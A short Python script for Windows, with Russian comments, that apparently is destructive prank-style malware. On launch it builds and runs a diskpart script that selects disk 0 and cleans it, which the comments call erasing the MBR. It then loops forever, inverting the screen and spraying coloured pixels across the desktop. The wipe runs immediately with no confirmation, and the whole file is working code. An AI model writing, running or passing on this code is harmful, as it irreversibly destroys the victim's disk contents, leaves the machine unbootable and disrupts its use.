import win32gui
import win32con
import win32api
import random
import time
import threading
import os

def invert_screen(duration):
    hwnd = win32gui.GetDesktopWindow()
    hdc = win32gui.GetWindowDC(hwnd)
    width = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
    rect = (0, 0, width, height)
    win32gui.InvertRect(hdc, rect)
    win32gui.ReleaseDC(hwnd, hdc)
    time.sleep(duration)

def fill_screen_with_color(color):
    hwnd = win32gui.GetDesktopWindow()
    hdc = win32gui.GetWindowDC(hwnd)
    width = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
    for _ in range(50000):  # Уменьшаем количество итераций
        x = random.randint(0, width - 1)
        y = random.randint(0, height - 1)
        win32gui.SetPixel(hdc, x, y, color)
    win32gui.ReleaseDC(hwnd, hdc)

# Функция для выполнения эффектов одновременно
def execute_effects():
    while True:
        t1 = threading.Thread(target=invert_screen, args=(5,))
        t2 = threading.Thread(target=fill_screen_with_color, args=(0x0000FF,))
        t1.start()
        t2.start()
        t1.join()
        t2.join()

# Функция для стирания MBR
def erase_mbr():
    try:
        os.system("echo select disk 0 > erase_mbr_script.txt")
        os.system("echo clean >> erase_mbr_script.txt")
        os.system("echo exit >> erase_mbr_script.txt")
        os.system("diskpart /s erase_mbr_script.txt")
        print("MBR успешно стерта.")
    except Exception as e:
        print("Произошла ошибка при стирании MBR:", e)

# Вызываем функцию для стирания MBR
erase_mbr()

# Запуск выполнения эффектов
execute_effects()
